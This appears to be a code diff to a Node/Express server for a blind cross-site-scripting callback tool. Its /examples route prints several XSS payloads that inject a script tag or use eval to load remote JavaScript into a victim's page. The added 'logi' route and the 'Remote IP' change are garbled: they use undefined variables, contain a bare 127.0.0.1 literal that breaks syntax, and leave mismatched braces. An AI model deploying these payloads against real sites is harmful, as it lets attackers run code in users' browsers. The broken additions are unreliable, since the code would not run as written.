@@ -101,13 +101,26 @@ app.get("/examples", (req, res) => {
   var url = "https://" + req.headers["host"];
   //var url = `http://globalcu.org${req.headers["host"]}`;
   //var page = "/*"; // This represents a wildcard path
-  var page = "";
+  var page = "/";
   page += `\'"><script src="${url}"></script>\n\n`;
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
   page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
   page += `<script>$.getScript("${url}")</script>`;
   res.send(page);
   res.end();
+});
+
+app.all("logi", (req, res) => {
+  res.header("Content-Type", "text/plain");
+  var url = `http://whoer.net${req.headers["host"]}`;
+  res.send(page);
+  var message = req.query.text || req.body.text;
+  const alert = generate_message_alert(message);
+    request.post(slack_incoming_webhook, data, (out) => {
+    res.sendFile(path.join(__dirname + "pload.js"));
+  });
+});
+  };
 });
 
 app.all("/message", (req, res) => {
@@ -205,7 +218,7 @@ app.get("/health", async (req, res) => {
 app.all("/pload", (req, res) => {
   var headers = req.headers;
   var data = req.body;
-  data["Remote IP"] =
+  data["Remote IP"] = 127.0.0.1;
     req.headers["x-forwarded-for"] || req.connection.remoteAddress;
   const alert = generate_callback_alert(headers, data, req.url);
   data = {
